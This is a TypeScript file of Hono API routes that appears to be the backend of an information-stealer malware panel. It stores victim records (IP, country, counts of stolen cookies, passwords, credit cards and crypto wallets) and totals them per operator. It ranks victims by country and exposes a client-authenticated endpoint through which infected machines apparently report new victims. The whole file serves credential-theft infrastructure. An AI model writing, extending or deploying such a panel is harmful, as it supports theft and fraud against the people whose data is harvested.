import { logsTable, uploadsTable, usersTable } from "@/database/schema";
import { authMiddleware } from "@/middleware/auth.middleware";
import { cubaclientMiddleware } from "@/middleware/cubaclient.middleware";
import { roleMiddleware } from "@/middleware/role.middleware";
import { database } from "@/utils/database";
import { eq, inArray } from "drizzle-orm";
import { Hono } from "hono";

type User = typeof usersTable.$inferSelect

export const logs = new Hono()

logs.get('/', authMiddleware, async (c) => {
    const user = c.get('jwtPayload') as User
    const rows = user.role === 'admin'
        ? await database.select().from(logsTable)
        : await database.select().from(logsTable).where(eq(logsTable.userId, user.id))

    if (rows.length === 0) return c.json([])

    const logIds = rows.map(r => r.id)
    const uploads = await database
        .select({ logId: uploadsTable.logId, uploadId: uploadsTable.id })
        .from(uploadsTable)
        .where(inArray(uploadsTable.logId, logIds))

    const uploadMap = new Map(uploads.map(u => [u.logId, u.uploadId]))

    return c.json(rows.map(log => ({
        ...log,
        uploadId: uploadMap.get(log.id) ?? null,
    })))
})

logs.get('/stats', authMiddleware, async (c) => {
    const user = c.get('jwtPayload') as User
    const all = user.role === 'admin'
        ? await database.select().from(logsTable)
        : await database.select().from(logsTable).where(eq(logsTable.userId, user.id))

    const totals = all.reduce(
        (acc, log) => ({
            logs: acc.logs + 1,
            cookies: acc.cookies + log.cookies,
            passwords: acc.passwords + log.passwords,
            creditcards: acc.creditcards + log.creditcards,
            cryptocurrencies: acc.cryptocurrencies + log.cryptocurrencies,
        }),
        { logs: 0, cookies: 0, passwords: 0, creditcards: 0, cryptocurrencies: 0 }
    )

    //last 30 days, one bucket per day
    const thirtyDaysAgo = Date.now() - 30 * 24 * 60 * 60 * 1000
    const dayBuckets: Record<string, number> = {}

    for (let i = 29; i >= 0; i--) {
        const d = new Date(Date.now() - i * 24 * 60 * 60 * 1000)
        dayBuckets[d.toISOString().slice(0, 10)] = 0
    }

    for (const log of all) {
        if (log.createdAt < thirtyDaysAgo) continue
        const date = new Date(log.createdAt).toISOString().slice(0, 10)
        if (date in dayBuckets) dayBuckets[date]++
    }

    const byDay = Object.entries(dayBuckets).map(([date, count]) => ({ date, count }))

    const countryCounts: Record<string, number> = {}
    for (const log of all) {
        countryCounts[log.country] = (countryCounts[log.country] ?? 0) + 1
    }

    const byCountry = Object.entries(countryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 10)
        .map(([country, count]) => ({ country, count }))

    return c.json({ totals, byDay, byCountry })
})

logs.delete('/delete/:id', authMiddleware, roleMiddleware('admin'), async (c) => {
    const { id } = c.req.param()
    await database.delete(logsTable).where(eq(logsTable.id, id))
    return c.json({ message: 'deleted' })
})

logs.post('/create', cubaclientMiddleware, async (c) => {
    const { userId, name, ip, country, cookies, passwords, creditcards, cryptocurrencies } = await c.req.json()

    if (!userId || !name || !ip || !country) {
        return c.json({ message: 'userId, name, ip and country are required' }, 400)
    }

    const [row] = await database.insert(logsTable).values({
        userId,
        name,
        ip,
        country,
        cookies: cookies ?? 0,
        passwords: passwords ?? 0,
        creditcards: creditcards ?? 0,
        cryptocurrencies: cryptocurrencies ?? 0,
    }).returning({ id: logsTable.id })

    return c.json({ message: 'log created', logId: row.id }, 201)
})
